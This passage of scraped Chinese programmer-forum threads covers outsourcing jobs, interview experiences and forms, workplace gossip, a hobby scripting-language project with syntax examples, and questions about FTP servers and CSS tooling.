，起码离 UC 近点，以后可以获得更多信息，早点转正。", " 此话怎讲？亲，有过对这方面有了解吗？求指点，", " 在广东中软国际是知名的“大公司”。知名的原因在于校招的时候来学校拉人面试，去到面试多半都说你技术不行快交三万来培训。中软国际在外包方面也非常出名，搜搜就知道了。\r", "如果觉得技术不够进不了 UC ，不如去其他地方混混。毕竟当亲儿子才不会那么苦逼。", "外包没有归属感", "呵呵的一家公司", " 非常的同意, 外包在别的公司感觉怪怪的", "震惊！！！中软国际外派到 UC 的人竟然做这种职位！ 13 亿中国人都不知道的秘密", "做什么不好，要做皇协军......", "3 年前 骂中软的主要是骂外包， 如今看来培训业务已经后来者居上了 #(滑稽)", "另外 外包哪有什么转正一说的，我反正身边的没听说。\r", "要转正那也是你在外包公司转正了，你的资料工资都是在外包公司管理的\r", "外包就和临时工一样，人手不够或者说钱不够找来帮忙的。", "“中软国际有限公司....在中国 IT 行业享有极高的声誉。”   -- 百度百科", "V2 真是越来越水了，人家是正儿八经上来咨询的，这么多回帖都在水，没几个实质性意见的。", "看项目", "接近阿里 P5 水平的话为什么要去这种公司呢", "外包转正太难了", "阿里 P5 级别的，在广州可以选择的公司有 YY ，唯品会，菲音， 37 玩， 4399 ， PPMoney\r", "网易游戏和腾讯有点困难\r", "所以，何必去做劳务派遣的工作呢？", "好奇， P5 正常是什么薪资水准 o(╯□╰)o", "当初中软在我们学校来招生，感觉是见人就要。。。", " 谢谢你的建议。\r", "\r", "我想通过中软去 UC ，主要是因为想找一个稳定的公司，好好沉淀下自己的技术。\r", "然后这个是离 UC 最近的地方了，也可以比其他人更早知道 UC 更多的信息，转正机会也比去外面公司要大很多。", "争取转正", "跟你签合同的是中软国际，你确定有通道可以和中软国际解除劳动合同，和阿里签合同？", " 好的，谢谢！", " 不确定。但中软的 HR 说，之前已经有两个人转为 UC 正式员工了。但也不确定她有没有骗我。。。\r", "\r", "其实基本决定了，准备签，无论外不外包，先好好撸起袖子加油干先。\r", "假若几个月后 UC 有 P5 的招聘名额，自己足够优秀的话， UC 也会招吧。", " 因为 UC 就是阿里子公司。。。 _(:3 」∠)_", " 这种公司是指中软。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>好怕好怕，但现在不想憋下去了，我要勇敢而自豪地说出来。</p>\n<p>如果你佩服我的勇气，就请粉我一个呗：</p>\n<h1>我的<a href=\"https://github.com/zhanzhenzhen\" rel=\"nofollow\">GitHub</a></h1>\n</div></div>"], "reply": "124", "tittle": "如果一个程序员是伪娘，还会被人崇拜吗？", "comment": ["额，伪娘应该没人爱吧。如果你是程序员鼓励师那么会很受欢迎", "计算机的主要发明人之一的图灵就是同性恋，而且是受", "楼主你这个不叫 hentai 啊！不要自我指责！人的性取向问题本来就非常复杂哒！", "腾讯不是有个美工叫什么来着，就是伪娘，很大牛", "首先，一个程序员为什么会被崇拜？", "三流程序员写 UI\r", "二流程序员写架构\r", "一流程序员写算法\r", "顶级程序员穿女装\r", "\r", "老铁 没毛病吧", "Zhenzhen Zhan\r", "zhanzhenzhen\r", "中国最早(89 年)最小(7 岁)开始学编程的一批人之一 得过一些奖 和别的程序员不太一样 比较喜欢呆萌和逗(niang)比(pao) 35 岁了但经常被误认为高中生～哎", "还有人崇拜程序猿？？？", "每次用滴滴打车，看准车牌号走上去，司机总是无视我。我只能敲窗，司机会说：“不是你，是个女的。”我会说：“是我，我是去 XX 。”然后司机才会相信。来自楼主博客。。。。感觉楼主不停在强调自己是女的", " 哈哈哈哈哈哈哈哈", "\r", "\r", "楼举还是好好的把头像搞一搞, 花点心思拍个艺术点的嘛, 不然怎么对得起伪娘这么美好的词, 请参考知乎的栗子", "长相不太合适", "会写程序的不会崇拜程序员\r", "不会写程序的会崇拜程序员？\r", "程序员不会写程序的是多数\r", "gay 程序员基本很难看\r", "伪娘是日本语，中文正式称为异装癖，个人爱好，和打麻将玩游戏没区别", "看到群里一张图片.....跑来 po 一下\r", "自己喜欢就好，管别人干嘛", "lz 大神啊\r", "前两天还在 v2 看到有人发现代前端发展的 PPT 附上女装照片的\r", "～～ 只是女装大佬吧，伪娘差远了", "hentai", "这些事情，其实很简单的，只跟颜值有关。", "还是喜欢大屌萌妹....", "我还以为说的是 cosplay ，点开才发现就是字面意思，还在公司啊。。。 v2 也要开 NSFW 吗", " （互联网） 不适宜工作场所（\"Not Safe (or Suitable) For Work;\"），即包含成人影像或图片，可能会冒犯到雇主或同事。", " +1"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，想和人一起共享一个授权，实在有点贵！\n其实就是用来编译下代码，有点浪费！</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "有人用 qt 开发跨平台移动应用吗，感觉有点贵？", "comment": []},
{"content": ["<div class=\"topic_content\">又不是入职填表，面试不一定过啊，过了也不一定去啊。填表跟查户口似的，还要填上家公司的薪资和证明人、问你全家的信息和联系方式，以及一大堆早就写在简历上的信息，感觉很不尊重面试者</div>"], "reply": "68", "tittle": "真反感有些公司面试填表就跟查户口似的", "comment": ["选几个空填下基本信息就可以，又不用你全部天蝎。", "我也遇到过，一个上市公司，里面详细的一比，我就填了个人基本信息，其他全空白", "上次有个公司也这样，我只填了一小部分，然后就被 HR 以“过来人”的身份上了一课，说“公司是一个大家庭，我们和别家公司不一样之类的”，听玩之后很反感。", "要拨开云雾见本质, \r", "表面上是让你个人信息, 其实是在试探你的\"好管理, 服从度\", 向楼上那种只填个人信息的, 一般就是性格比较强, 倔强型老油条. 如果都填满了的, 说明涉世较轻, 容易忽悠.", "这种填表我都是敷衍的。\r", "给你推荐两个词（暂无，待定）", "你不知道大数据也有离线版啊？", " 填个表都带有这种目的这种公司也没什么意思", " 天蝎莫名躺枪", "以前不懂基本都填满，现在要是遇到估计直接回家睡觉了", "其实 HR 也就只是随便网上 copy 了一份打印了而已...老哥不要想太多啊", " 直接给 HR 说：我还有点事，今天就到这吧。收拾东西走人。", "入职才填详细的，面试只填简历上有的内容。入职有的公司就比较变态了。比如我现在这个的，入职的时候填《履历表》，甚至有“文革中犯过什么错误，组织上的结论是什么” 之类的问题……", "不填也不要填", "如果不是入职就不写那么详细", " \r", "我之前也遇到一个，然后填写了几个简历中填写的关键信息，然后被 HR 上了一课 ，说我不尊重她们 HR 。", "你可以问下 hr 需要全填吗，如果必须，则发个好人卡给他，然后转身离开", "这种公司一般也看年龄资历", "“详见简历”", "我以前也遇到过。\r", "\r", "让我不爽的是和笔试题一块给我的，题我都做完了。\r", "那表我就填了几个基本的，结果非让我把表填满，我扭头就走了。\r", "妈蛋浪费一下午时间。", "目的可能是收集后售卖给猎头。 这种资料价格很贵的。", " 真的假的", " 6666", "昨天遇到一个， 前台给我的， 我写了个姓名就还给他了， 然后开始面试。。", "其实就是众口难调，所以直接找一个模版给大家用，你乐意写什么就写什么呗。\r", "话说，常青藤联盟大学入学的时候，也很详细的要求写父母是做什么的，怎么没人反感呢？", " #21 并不是卖给 而是拿你的资料去换取更多资料 然后打电话联系继续面试.大概是数据交换的过程.", "因为这份表是网上下载的，然后原封不动打印了几百份，上述工作是在 5 分钟内完成的，相关员工接下来愉快地逛起了 x 宝。", " #21 因为 HR 获取一份高质量简历也很难的,所以必须要建立一些自己的资源.绝对没有你想象中的在网上发个招聘好简历一大把都挑不过来的程度.", "整体来说只要填写联系方式就行了. 他们更多也只是备案一下.跟老板核算一下绩效.今天面试了多少人之类的.", "遇到那种非得全部填完的直接回家睡觉", " 中国大学难道不填吗？", "我们公司啥都不填\r", "\r", "挺恶心那些每次面试都重新填的，填半个小时，面 5 分钟", "同恶心这种，明明打印的表格上面全都有。", "我觉得填一下姓名 /出生 /学习经历 /工作经历 /联系方式就好，然后遇到过一家公司要我把一张表格所有留空的地方填满。中间我还跟那 hr 对喷了一下，说填这些无谓的信息干嘛，然后那 hr 直接回一句老板说的一定要填满。", "其实就是下载个模板……", "当时学校上就业指导课的时候，讲到个人介绍就说得写家庭状况之类，直接被恶心到了。\r", "\r", "我自己去面试上班为啥还要牵连到家里人去？", "父母信息之类的我从来都是不填的.身份证一般也不写.\r", "然后还是顺利入职...", " 看到我的头像了！", " 我现在只要听见哪个公司面试的时候谈什么“公司是个大家庭”这样的屁话我立马恭维两句赶紧跑路", "其实可以不填，他们又不知道你是不是单亲家庭真正入职再说。", "选填个别能联系到自己的的就 OK 了", " 公司是个大厕所", "让人事麻烦打印网站上投递的简历", " 也要写家庭信息，但是不像美国，因为他不了解你父母的机构，所以要对工作的公司进行描述。如果是自营，还要写年营业额，利润，规模，行业地位什么的。这时候大家都高高兴兴的吹牛逼的写一通，生怕没法通过面试。。\r", "我那时候写的是私营企业，年收入 100 亿美元，利润 30 亿美元，然后就一堆老头老太太问这个问那个，直到我出示我在高盛的名片，才不再继续问我，他们告诉我通过面试的时候，我说我就是想试试这个名片是不是真的有用，而我还是比较喜欢清华大学，然后我就被轰出来了。所以，歧视和隐私收集哪里都有，只不过去了国外屁都是香的，没人说而已。", "去年面试一家公司\r", "本来不知道公司啥样..打电话我就同意过去面试了...然后就开始做了 3 页的笔试题,.还要现场 看学信网,看就看吧....还要截图...面试问我对他们公司有啥看法.我说外包,又问我有兴趣吗..我说没..哈哈哈哈 然后他就说那就先这样吧...我说 那我得把我学信网截图删了....", " 果然是套路", " “文革” 的信息都要？谍报机关么？", " #46  跟一些国企做过管理系统   一般来说  那些“老不死”的国企一般都会有这些信息   升职加薪的时候 这也是一个指标", "曝光公司名", "敏感信息每次都空下，然后好像也没强制要继续填，一般都是看个人经历和期望薪资吧，这些不填会让补上", " 我去年也面试过一家公司，要做 6 页试卷，写了我整整一下午，现在想想真傻逼", "楼上各位说反感的，上家的职位和薪资 BAT 入职必填。", "上次去一家小公司面试要求全填的直接我就走人了", " 你回答”既然你说公司是个大家庭，那你的意思就是马上要给我发 Offer 了是么“看他怎么说\r", "\r", "\r", " ”入职“和”面试“是两回事", "这种填基本的就好了，大公司无可厚非。还特烦小公司要笔试的，还那么厚一沓，不知是诚心找人还是秀存在感的。。", " 哈哈，这样子感觉太 rude 、太有攻击性了，还是闷声发大财的好", " 哈哈 是这样的", "你去申请签证的时候更恶心，祖宗十八代都查，去世几十年的人的信息都要写。\r", "美国的表格最恶心又臭又长，最奇葩的是还问家里是否有人支持共产主义。迟早被英特奈雄奈儿。", " 这个倒是遇到过，去了一个公司，面试不满意，然后那个公司的 hr 把我的简历给了另外一个公司的人事了", "不是一般发完 offer 之后,办理入职手续的时候填写那些具体信息么?", "本司入职护照已上缴", " #4 我就是那容易忽悠的。。。总有不安全的感觉", "以前傻傻填，现在才不会填，爱要不要，我还不想进你们大家庭了呢", " 就算是这个目的，像楼主遇上这种面试时索要完全无关的资料的表格并不合理，尤其是家人的资料。", "很奇怪吗？看来是你少见多怪。从上幼儿园开始，你就开始填各种信息登记表。 HR 也没那个闲心绞尽脑汁给你准备一份精美的面试表，从网上找一份改一下就打印出来了，没必要各种阴谋论，人家公司的面试表比招聘网站安全多了。", "确实反感，不过我碰到的没填也没关系", "我公司面试自带简历一份，还有笔记本电脑，方便面试者演示。\r", "\r", "其余资料，确定入职时才需要填写。", "我有强迫症 一定要填满 要是面试感觉不对 这个表我会拿走的", " 你为啥会被赶出来？"]},
{"content": ["<div class=\"topic_content\">我面试的 java 面试官居然叫我说出最大的素数 我当时就蒙逼了...心想素数这玩意有最大值吗？</div>"], "reply": "8", "tittle": "说说你们面试的时候觉得最难的题。", "comment": ["那么问题来了，  素数有最大值吗？", "假设 n 是最大素数，那么 n! + 1 不能被所有素数整除，证伪完毕\r", "考官或许想要的是这个答案？", "lc 上我做不出来的都没被问 hhhh", "『和女朋友到那一步了』", "你为什么要来我们公司？\r", "你想要多少钱？", "哥德巴赫猜想", "你都 30 几岁了，为什么还不结婚?"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>原谅我标题党了，搜了一下 v2 ，之前没人谈论过吗，看来是珠海的 v 友太少了=.=</p>\n<p>看了一下，知乎：<a href=\"https://www.zhihu.com/question/54987066\" rel=\"nofollow\">在珠海时代互联(优品科技)工作是怎样一番体验？</a></p>\n<p><a href=\"http://i.imgur.com/idW6G0j.png\" rel=\"nofollow\">http://i.imgur.com/idW6G0j.png</a></p>\n<p>感觉可以进<a href=\"https://github.com/shengxinjing/programmer-job-blacklist\" rel=\"nofollow\">黑名单</a>了。</p>\n</div></div>", "<div class=\"topic_content\">你们看清楚再评论好吧，不是试用期 8 折，知乎上说是试用期的钱再 8 折。是折上折。</div>"], "reply": "105", "tittle": "第一次听说工资可以打八折", "comment": ["招聘的时候写 20k  实为 16k  这个促销活动划得来。", " 通常离职员工很少会这样聚集起来说公司的。 我上一家公司和离职的聚集起来就是为了讨薪。也许你的哥们在里面混的不错……", " 加班肯定要加啊，不过工资什么的不会少你的，不加班的 it 公司不是好公司啊哈哈", " 哈哈哈，耿直，早上漏看了", "试用期不是正式工资的 80%吗？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这个项目是我去年做毕业设计时写的，毕业之后就没有再坚持下去，但是一直对这方面挺感兴趣的，想在业务时间把这个项目继续下去，不知道大家有没有什么好的想法能让这个项目更有意义，求指教。</p>\n<p>用 Flex 和 Bison 配合实现的，词法和语法解析。\n用到了 libQt5Core （纯 C++用不习惯，为了撸的快点。。。）</p>\n<p>脚本名字叫： zScript （求不要喷我没文化）</p>\n<h3>变量的定义</h3>\n<p>变量使用关键字“ var ”进行定义。\nzScript 提供了两种形式的变量定义语句。</p>\n<h5>1.直接定义的形式，该语句的一般形式为：</h5>\n<pre><code>var 标识符;\n</code></pre>\n<p>该语句的含义是：定义变量名为“标识符”的变量。例如：</p>\n<pre><code>var a;\n</code></pre>\n<p>该语句的作用是：定义一个名为“ a ”的变量。</p>\n<h5>2.定义同时给变量初始化赋值，该语句的一般形式为：</h5>\n<pre><code>var 标识符 = 表达式;\n</code></pre>\n<p>该语句的含义是：定义变量名为“标识符”的变量，且给变量赋值为表达式的结果。例如：</p>\n<pre><code>var a = 1 + 2;\n</code></pre>\n<p>该语句的作用是：定义一个名为“ a ”的变量，且赋值为 3 。\n“ var ”关键字可同时定义多个变量，每个变量之间使用符号“,”分割。</p>\n<h3>匿名函数的定义</h3>\n<p>匿名函数定义的一般形式为：</p>\n<pre><code>(形参列表) {\n\t语句组\n}\n</code></pre>\n<p>该语句的含义是：生成一个函数对象，例如：</p>\n<pre><code>(a) {\n\tconsole.log(a);\n}\n</code></pre>\n<p>该语句的作用是：定义一个函数，它有一个名为“ a ”的形参，执行此函数会将 a 的值打印到屏幕上。\n形参列表，可为空、一个、多个，多个形参之间使用“,”分割。</p>\n<h3>数组的定义</h3>\n<p>数组定义的一般形式为：</p>\n<pre><code>var a = [表达式 1, 表达式 2, ...];\n</code></pre>\n<p>该语句的含义是：生成一个数组，数组元素为中括号中表达式的结果。例如：</p>\n<pre><code>var a = [1, 2, 3];\n</code></pre>\n<p>该语句的作用是：定义一个包含三个元素的数组，元素的值分别为 1 、 2 、 3 ，然后赋值给变量 a ；\n数组使用“[”“]”定义，中间内容可以为空、一个表达式、多个表达式，多个表达式之间使用“,”隔开。</p>\n<pre><code>a = a[0];\n</code></pre>\n<p>取数组元素语法和 C 语言一样，都是中括号中写入数组下标。</p>\n<h3>选择控制语句</h3>\n<p>一个选择结构，包括一组或若干组操作，每组操作称为一个分支。通过选择控制语句可以实现选择结构。选择控制语句包括 if 语句、 switch 语句及起辅助控制作用的 break 语句。\nIf 语句用于计算给定的表达式，根据表达式的值是否为假，决定是否执行某一组操作。\nSwitch 语句首先求解一个表达式，然后根据计算结果的值，从哈希表中查询该从哪一组操作开始执行。\nBreak 语句用于 switch 结构中，用于终止当前 switch 结构的执行。\n####if 语句\nzScript 提供了两种形式的 if 语句。</p>\n<h5>1.单 if 子句的 if 语句。该 if 语句的一般形式为：</h5>\n<pre><code>if(表达式)\n{\n\t语句组\n}\n</code></pre>\n<p>该语句的含义是：只有表达式的值为非零值时，才执行其内部的语句组。例如：</p>\n<pre><code>if ( a &gt; b )\n{\n\tconsole.log(“ hello ”);\n}\n</code></pre>\n<p>该语句的作用是：当 a 的值大于 b 的值时（此时，“ a&gt;b ”的值为真，为非假值），在屏幕上显示“ hello ”；否则，不显示“ hello ”。</p>\n<h5>2.带 else 子句的 if 语句。该 if 语句的一般形式为：</h5>\n<pre><code>if ( 表达式 )\n{\n\t语句组 1\n} else {\n\t语句组 2\n}\n</code></pre>\n<p>该语句的含义是：当表达式的值为非假时，执行语句组 1 ，而不执行语句组 2 ；否则，即表达式的值为假时，执行语句组 2 ，而不执行语句组 1 。例如：</p>\n<pre><code>if ( a &gt; b )\n{\n\tconsole.log(“ hello1 ”);\n} else {\n\tconsole.log(“ hello2 ”);\n}\n</code></pre>\n<p>该语句的作用是：若 a 的值大于 b 的值（此时“ a&gt;b ”为真，为非假值），则在屏幕上显示“ hello1 ”，而不显示“ hello2 ”；否则，即表达式的值为假时，显示“ hello2 ”，而不显示“ hello1 ”。</p>\n<h4>switch 语句</h4>\n<p>Switch 语句与 if 语句一样，也可以实现分支选择。但 if 语句是判断一个表达式的值是否为假，决定是否执行某个分支；而 switch 语句是计算一个表达式的值，根据计算结果，从哈希表查询从哪个分支开始执行代码。 Switch 语句的一般形式为：</p>\n<pre><code>switch( 表达式 )\n{\n\tcase 常量 1 ：\n\t语句组 1\n\tcase 常量 2 ：\n\t语句组 2\n\t...\n\tcase 常量 n ：\n\t语句组 n\n\tdefault:\n\t语句组 n + 1\n}\n</code></pre>\n<p>switch 语句的执行过程：</p>\n<ul>\n<li>1.求解“表达式”的值；</li>\n<li>2.如果“表达式”的值与某个 case 后面的“常量”的值相同，则从这里开始顺序执行语句。结果 switch 执行有两种形式：一是遇到 break 语句为止；二是未遇到 break 语句，则程序依次执行完所有语句组。</li>\n<li>3.如果“表达式”的值与任何一个 case 后面的“常量”的值都不相同，当有 default 子句时，则执行 default 后面的语句，如果没有 default 子句，则结束 switch 。</li>\n</ul>\n<p>其中 break 的一般形式为</p>\n<pre><code>break;\n</code></pre>\n<h3>循环控制语句</h3>\n<h4>while 语句</h4>\n<p>while 语句的一般形式为</p>\n<pre><code>while( 表达式 )\n{\n\t循环体\n}\n</code></pre>\n<p>while 语句的执行过程：</p>\n<ul>\n<li>1.求解小括号中表达式的值。如果表达式的值为真，转第 2 步；否则转第 3 步。</li>\n<li>2.执行循环体，然后转第 1 步。</li>\n<li>3.执行 while 语句后面的语句。</li>\n</ul>\n<p>小括号中表达式的值是否为假，决定着循环体是终止还是继续循环。因此，该表达式的值为循环条件。 while 循环语句的执行特点是，先判断循环条件是否成立，然后决定是否执行循环体。\n当 while 语句的循环体只包含一条语句时，包含该循环体的“{}”可以省略。</p>\n<h4>for 语句</h4>\n<p>在两种循环语句中， for 语句最为灵活。 for 语句的一般形式为：</p>\n<pre><code>for (表达式 1; 表达式 2; 表达式 3)\n{\n\t循环体\n}\n</code></pre>\n<p>for 语句的执行过程：</p>\n<ul>\n<li>1.求解表达式 1 的值。</li>\n<li>2.求解表达式 2 的值，若其值为假，则结束循环，转第 4 步；若其值为真，则执行循环体。</li>\n<li>3.求解表达式 3 。</li>\n<li>4.结束循环。</li>\n</ul>\n<h3>对象的定义</h3>\n<p>对象定义的一般形式为：</p>\n<pre><code>{\n\t属性名 1: 属性的值,\n\t属性名 2: 属性的值,\n\t...\n\t属性名 n: 属性的值,\n\t属性名 n+1: 属性的值\n}\n</code></pre>\n<p>例如：</p>\n<pre><code>var object = {\n\tname: \"张三\",\n\tage: 18\n};\n</code></pre>\n<p>变量 object 即是一个对象，它包含两个属性。\n注：当对一个对象不存在的属性赋值时会将此属性加入到对象中，例如：</p>\n<pre><code>object.sex = '男';\n</code></pre>\n<p>对象 object 中就会多出一个“ sex ”属性。</p>\n<p>理论上来说是可以跨平台的，但是其它平台还没适配，目前只能在 Linux 下正常使用。\n上面的介绍没有覆盖所有的语法，比如函数中返回多个值之类的\n项目中附带了一个 dome ，用 zScript 写的一个终端中跑的贪吃蛇游戏。</p>\n<p><a href=\"https://github.com/zccrs/zScript\" rel=\"nofollow\">源码： Github （ https://github.com/zccrs/zScript ）</a></p>\n</div></div>"], "reply": "7", "tittle": "毕业设计真是件麻烦事，没啥好的想法，不知道写啥。就根据自己的喜好实现了一个脚本解释器（语法类似于 js）", "comment": ["标题看前半段我就想进来说，写个图书馆管理系统 [手动滑稽]", "2333 ，楼上+1 。。。", " 写这个的还真不少。。。。各种系统，各种网站", "楼主好巧，我毕设也是脚本引擎：\r", "\r", "跟楼主一样打算业余时间搞下去，可惜深感自己太菜，现在跑去刷题了。打算学成之后再来接着搞。", "都是大神，一个渣渣的我路过", "随便选个算法 钻研一下～ 本科论文又不需要太高要求～又不用写 XX 系统那些脏活～哈哈", " 加油"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>嗯，我是小号！大号被怼碎了</p>\n<p><img alt=\"FA9079C83FFE7137E4C4C7A094CDF284.jpg\" src=\"https://ooo.0o0.ooo/2017/03/19/58ce194c5c1ed.jpg\"></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "近半年读完/消化掉的书单", "comment": []},
{"content": ["<div class=\"topic_content\">是 linux 平台下的， vsftpd 除外</div>"], "reply": "3", "tittle": "大家用什么软件搭建 ftp 服务器的", "comment": ["proftpd", "pyftpdlib 因为跨平台, 而且比较方便, 在权限不足情况下也能用", "filezilla 貌似也能做 ftp 服务器。\r", "\r", "vsftpd 不是挺好的，为啥除外。"]},
{"content": ["<div class=\"topic_content\">听说微影的技术 vp 招了很多程序员，利用职务让大家做她接的外包，据说都是百万级别的单子，尤其听闻她在公司的情人之一从一个 PHP 屌丝程序员变成开保时捷的技术主管。厉害了 word 亲。</div>"], "reply": "41", "tittle": "公司 VP 利用职务，在上班时间带一波程序员接私活合理合法吗？", "comment": ["“一个 PHP 屌丝程序员”\r", "\r", "我相信你会后悔发这句话（", "这有什么，我是一个 c/c++屌丝程序员，可我开的车是奔驰", "捕风捉影的事情不讨论- -", "哈哈哈，黑走 VP 又不给你上位~", "听说、据说、尤其听闻。", "\"一个 PHP 屌丝程序员\"\r", "讲道理，运气也是实力的一部分\r", "\r", "眼红别人为什么不自己想想怎么努力呢\r", "\r", "另外破鞋 711 Boxter 也就 70W 而已", "卧槽，楼主说的 VP 是我曾经的同事，以前经常一起吃饭。", "楼主你连发 2 帖黑 VP ，用意很明显啊。而且你这个号就只有这两个帖。", "> 一个 PHP 屌丝程序员变成开保时捷的技术主管\r", "他是不能开保时捷还是不能当技术主管？", "那是人家的实力\r", "你背后黑人才是真·屌丝", "楼主恨为什么自己不是 VP 的情人。", "哼，我就是那个 VP ，怎么滴？后端那活扔给你了，钱一会打到你微信。\r", "\r", "结帖", "又黑 PHP", "LZ 这个羡慕嫉妒恨哟。。。", "已经通知当事人，楼主等着接警察电话。", "- -很正常 之前我司领导接私活直接跟我说这是私活  会额外给钱 一个页面 200 快 写了 10 个页面给了我 2100 ，当时还挺开心的 毕竟是外快 但是发现他接单的时候价格是 12000....只给了我零头...", "这醋味儿。。。。有本事找老板反映啊", "如果公司给的钱有限，那么在完成公司任务的情况下，合理利用团队优势，出去接活儿，为下属变相加薪，我个人是姿磁的～", " 他能拉来这个订单是他的能力，他不给你做，换一个其他人，可能一个页面 100 块，你一分钱也拿不到，这样你也没啥好说的啊。我是就事论事，说话直接。", " 我跟你讲个故事，是真实的\r", "有个 傻逼 A ，注册了个公司，找了几个技术（渣），到处接外包。\r", "然后自己用当年做得层次很低的破论坛软件 discuz 搞了个细分领域的论坛社区，换个模板皮肤。。。其实也很渣 而且也没几个用户，虚假繁荣！\r", "\r", "可是另一个 傻逼 B 看起来 很欣赏，觉得这是一家很有技术实力很有想法的公司。。。\r", "\r", "OK ，收购！ 500 多万！ 500 多万！\r", "300 万是现金，另外是折算成股权！\r", "然后那个 傻逼 A 套现 屌丝逆袭！并且获得这个公司 VP 职务！最后，又套现！\r", "\r", "虽然收购后 傻逼 B 也知道 傻逼 A 其实狗屁不是，但无奈自己已经很傻逼的那啥了，所以也没办法把那个傻逼再踢出局了，因为要赔很多钱。", "靠能力赚的钱，你有什么眼红的。。你能接百万级单子？你能当 VP 情人？还是你能开保时捷？\r", "如果都不能。。。干好自己的。看不爽举报给老板然后走人，恩，原来根正苗红的朝阳群众现实中还是很多的", "如果影响了工作，涉及到了公司利益，请直接向公司高层举报。\r", "如果没有，你一定是 dang 员吧。。。私生活就是私生活，人家乐意怎么着都跟你无关，有本事你也找情人，你找十个八个，只要不违法，不影响工作，都不应该成为别人评论你的理由。", "酸", "需要好好复习一下相关法律知识。", "举报有用，这种属于倒卖公司资源。很多互联网公司都存在这种情况，在外面开个公司，利用内部消息灵通及人际关系的便利，做一些内幕消息或者流量变现。举报之后就看什么时候高层斗争，这都是斗争的时候可以用到的武器，至于谁是举报人根本不重要。", "不合法啊,可以举报. dog", "她?她?她?", "我错了... 杨森淼果然是女的", " 我在现实中也碰到了。。。", "隔着屏幕都闻到一股醋味", "支持举报。", "我的手扶拖拉机都不好意思秀了。。。", "VP 应该算公司高层了吧。做这种事应该是有默契的。就别瞎操心了。", " 711 什么鬼...便利店么...", " 我司 CTO 就是这 b 样", " really? cool\r", "\r", " hhhhh", "什么程序员才不算屌丝程序员? 麻烦帮我知乎问一下.\r", "我几个虽然开豪车住豪宅,但是衣服乱头发少满头油的程序员不知道算不算屌丝.", " #20 没看出来 A 有什么傻逼的，真金白银拿到手，还不牛逼？", " #20 这种事情好像似曾相识 pxtx?", " no, 是 lc\r", "\r", "\r", " 愁死人了。。。", "应该不违法吧。\r", "如果给手下程序员的酬劳分红很丰厚，我想说：这人不错。私企公司打工，希望的老板和上司不就是这样的嘛？还想怎么样？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"sasa\" src=\"http://imgur.com/oSD2Io3.jpg\"></p>\n</div></div>"], "reply": "7", "tittle": "Google+的这种 hash CSS class 名 是用什么库实现的，什么原理？", "comment": ["关注。很好奇为什么要用这种奇怪的类？", "\r", "应该是这个。就是防 css 名字冲突之类的功能。", "css modules  ", "  也可以实现这个，需要配合 webpack/browserify 去使用\r", "\r", "可以在浏览器里面 inspect 一下 ", " 看看效果", "\r", "\r", "用 postcss 也行", "我觉得是防被爬", "头像撞车了？", " 我的是直的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大家进来聊聊薅羊毛的途径</p>\n</div></div>"], "reply": "9", "tittle": "有薅熊猫 TV 竹子的吗？", "comment": ["除了打赏主播还有什么用", " \r", "竹子 = 人民币啊\r", "你可以自己开个主播，然后拿小号给自己送竹子\r", "都是钱啊", "怎么薅？求老司机带带～", " 好像要签约才能套现", "这都能薅！？\r", "有点吃惊。", " \r", "应该有人会回收的，毕竟都是钱", "怎么薅", "我有 1 万多竹子谁给我换成钱？", " 飞机火箭  可以抢"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我应该也算比较早投内推简历的了， 2 月 22 号就提交上去了。然后大概在 2 月 27-28 的时候发现简历状态变成了初面中。</p>\n<p>当时还挺开心的，小伙伴们都还没在申请中，我就直接到初面了，哪知等了一周到 3 月 6 号才只等待一条 [通知 20 号之前会有人联系你进行面试] 的短信。好吧，正巧阿里这边在面试就没看携程了。</p>\n<p>上海那边的同学比我晚投，结果比我晚一天收到面试邀请（他是现场面）面完了以后又过了一周就直接拿到了 offer ，然而他说一面+HR 面，一共只有 20 分钟， 10 点半开始的面试， 10 点 53 就告诉我面完了。我以为只是上海那边先面，然而阿里面的也不顺利，所以就对携程这边上了点心。</p>\n<p>这周三还没有消息我就找了下携程内推我的学长，哪知学长告诉我现在还有很多人和我一样状态，有人初面资格直接跳到了面试淘汰，根本就没有收到面试。然后我还怀有一丝不切的幻想，直到今晚查了下，发现我也 gg 了~</p>\n<p>我确实自己承认自己水平有限，但是这么大一家公司，给了初面资格后对面试者不理不睬，太傲慢了吧？要么就干脆提高筛选门槛，直接指定 211/985+名企实习+开源大牛，要么就和阿里一样都给面试者一次机会，哪怕你面试完了把我挂了，我也会认为是我自己水平不够。</p>\n<p>现在搞得这样，我对携程也是彻底看扁了。</p>\n<p>原来有学长劝我不要去，说周六晚上 11 点半要他面试，这种公司不能去。最近也有大佬一直在提醒我，说携程中高级工程师都在想着往外跑，但我内心还是对这种大公司有一点期待，现在都是呵呵一笑。</p>\n<p>吐个槽实习还是要找，不能因为这个影响心态。给以后一些同学做一点参考吧，作为这件事唯一的意义~</p>\n</div></div>"], "reply": "26", "tittle": "携程今年的春招内推，给了初面资格，不理不睬三周后直接淘汰？", "comment": ["携程技术也不是特别出类拔萃，建议楼主另寻他家吧，总会找到好公司的。", "心态要看开点\r", "以后这样的烂事还更多", "去年某做路由器的厂商，就是在湖北轰轰烈烈春招完面试完只招武大华科俩 985 的。可能春招坑少，多投几家吧。", " \r", " \r", " \r", "恩，对心态影响其实没啥，主要想说一下这个事情，让更少的人踩坑", "211/985+名企实习也没什么用啊\r", "\r", "我也投过携程，过了很久都一点消息都没有\r", "\r", "我觉得应该就是因为简历太多了根本看不过来\r", "\r", "不用瞎猜是因为学校学历之类的被刷。。", " 莫非是路由器组装大厂 TP-LINK ? 看过知乎上他们员工的评价，该厂虽没啥技术含量但确实有深厚的 985 情结", " 我也赌是 TP ，去年去他们那里面试，面试官看见我成绩单上有 F 脸色直接变了……", "这就“彻底看扁了“了啊。。如果你还打算投大厂的话这种事情蛮多的，也不是说不理不睬，很多挂了之后都是统一来发拒信处理的。", "说到 TP-Link ，当年.. 某个组的 Leader 兴冲冲找我要简历说赶紧来 TP 愉快的玩耍\r", "具体情况就不说了，他说不用发简历了.. 不是 211 HR 